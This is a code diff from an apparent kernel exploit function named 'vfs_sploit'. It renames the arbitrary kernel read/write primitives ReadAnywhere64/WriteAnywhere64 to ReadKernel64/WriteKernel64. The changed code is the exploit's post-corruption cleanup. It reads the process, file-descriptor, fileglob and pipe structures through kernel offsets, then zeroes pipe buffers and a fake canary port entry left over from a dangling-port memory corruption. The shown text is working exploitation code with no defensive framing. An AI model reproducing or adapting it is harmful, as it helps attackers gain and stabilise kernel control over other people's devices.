@@ -1000,8 +1000,8 @@ void vfs_sploit() {
     // cleanup:
     
     // clean up the fake canary port entry:
-    WriteAnywhere64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t), 0);
-    WriteAnywhere64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) + 8, 0);
+    WriteKernel64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t), 0);
+    WriteKernel64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) + 8, 0);
     
     // leak the pipe buffer which replaces the dangling port:
     
@@ -1010,47 +1010,47 @@ void vfs_sploit() {
     // finally we have to fix up the pipe's buffer
     // for this we need to find the process fd table:
     // struct proc:
-    uint64_t proc_addr = ReadAnywhere64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    uint64_t proc_addr = ReadKernel64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
     
     // struct filedesc
-    uint64_t filedesc = ReadAnywhere64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
+    uint64_t filedesc = ReadKernel64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
     
     // base of ofiles array
-    uint64_t ofiles_base = ReadAnywhere64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
+    uint64_t ofiles_base = ReadKernel64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
     
     uint64_t ofiles_offset = ofiles_base + (target_port_read_fd * 8);
     
     // struct fileproc
-    uint64_t fileproc = ReadAnywhere64(ofiles_offset);
+    uint64_t fileproc = ReadKernel64(ofiles_offset);
     
     // struct fileglob
-    uint64_t fileglob = ReadAnywhere64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
+    uint64_t fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
     
     // struct pipe
-    uint64_t pipe = ReadAnywhere64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
+    uint64_t pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
     
     // clear the inline struct pipebuf
     LOG("clearing pipebuf: %llx\n", pipe);
-    WriteAnywhere64(pipe + 0x00, 0);
-    WriteAnywhere64(pipe + 0x08, 0);
-    WriteAnywhere64(pipe + 0x10, 0);
+    WriteKernel64(pipe + 0x00, 0);
+    WriteKernel64(pipe + 0x08, 0);
+    WriteKernel64(pipe + 0x10, 0);
     
     // do the same for the other end:
     ofiles_offset = ofiles_base + (target_port_write_fd * 8);
     
     // struct fileproc
-    fileproc = ReadAnywhere64(ofiles_offset);
+    fileproc = ReadKernel64(ofiles_offset);
     
     // struct fileglob
-    fileglob = ReadAnywhere64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
+    fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
     
     // struct pipe
-    pipe = ReadAnywhere64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
+    pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
     
     LOG("clearing pipebuf: %llx\n", pipe);
-    WriteAnywhere64(pipe + 0x00, 0);
-    WriteAnywhere64(pipe + 0x08, 0);
-    WriteAnywhere64(pipe + 0x10, 0);
+    WriteKernel64(pipe + 0x00, 0);
+    WriteKernel64(pipe + 0x08, 0);
+    WriteKernel64(pipe + 0x10, 0);
     
     for (int i = 0; i < total_fds; i++) {
         close(write_ends[i]);
